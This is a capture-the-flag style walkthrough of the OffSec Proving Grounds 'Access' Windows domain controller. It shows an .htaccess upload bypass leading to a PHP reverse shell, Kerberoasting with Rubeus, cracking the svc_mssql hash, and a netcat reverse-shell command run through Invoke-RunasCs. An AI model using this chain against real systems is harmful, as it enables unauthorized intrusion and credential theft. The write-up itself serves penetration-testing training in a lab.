# Access — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Windows (Active Directory)

---

## TL;DR

Website file upload bypass via `.htaccess` to drop a `.dork` PHP reverse shell → Get SPN for `MSSQLSvc` → Kerberoasting reveals hash for `svc_mssql` → Hashcat cracks to `trustno1` → `Invoke-RunasCs` for horizontal pivot.

---

## Enumeration

```bash
nmap -sC -p- -n -Pn -sV --min-rate=9362 192.168.151.187
```

**Open Ports:**
- **53**: DNS
- **80**: Apache httpd 2.4.48 (PHP 8.0.7)
- **88**: Kerberos
- **135, 139, 445**: RPC/SMB
- **389, 636, 3268, 3269**: LDAP
- **5985**: WinRM

This is clearly a Domain Controller for `access.offsec`.

---

## Exploitation — `.htaccess` Upload Bypass

Checking port 80, we find an "Access The Event" website featuring a "buy tickets" button which leads to a file upload functionality.

Attempting to upload standard `.php` files fails due to a filter. However, we can upload an `.htaccess` file to redefine what extensions execute as PHP:

1. Create a malicious `.htaccess`:
```bash
echo "AddType application/x-httpd-php .dork" > .htaccess
```

2. Upload `.htaccess`.
3. Upload a standard PHP reverse shell from [revshells.com](https://www.revshells.com/), but name it `exp.dork`.
4. Navigate to `http://192.168.151.187/uploads/exp.dork` while running a netcat listener.

We get an initial shell!

---

## Lateral Movement — Kerberoasting

Our current user lacks privileges. We upload `get-spn.ps1` to enumerate Service Principal Names (SPNs) in the domain.

This reveals an SPN for MSSQL:
```text
SPN(1) = MSSQLSvc/DC.access.offsec
```

Let's request a Kerberos ticket for this service and store it in memory:
```powershell
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'
```

We upload `Rubeus.exe` to extract the hash:
```powershell
.\Rubeus.exe kerberoast /nowarp
```

Rubeus dumps the `$krb5tgs$23` hash for `svc_mssql`.
Using `hashcat`, we crack it:
```bash
hashcat -m 13100 mssql.hash /usr/share/wordlists/rockyou.txt
# Password: trustno1
```

To pivot our shell to this user, we use `Invoke-RunasCs.ps1`:
```powershell
import-module .\Invoke-RunasCs.ps1
# Transfer nc.exe to C:\Windows\Tasks\
Invoke-RunasCs svc_mssql trustno1 'C:\Windows\Tasks\nc.exe 192.168.45.198 6970 -e cmd'
```

We now have a shell as `svc_mssql`. *(Note: Further escalation steps are required to reach SYSTEM/Domain Admin, but this establishes a solid domain foothold).*

---

## Key Takeaways

- **File Upload Filters**: If PHP extensions are blocked, dropping an `.htaccess` file can map arbitrary extensions (like `.dork`) to the PHP handler.
- **Kerberoasting from a Web Shell**: Even with low privileges, you can request Kerberos service tickets via PowerShell and dump them with Rubeus.
- **Invoke-RunasCs**: A fantastic script for executing commands as another user when you have their plaintext password but WinRM isn't available.

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
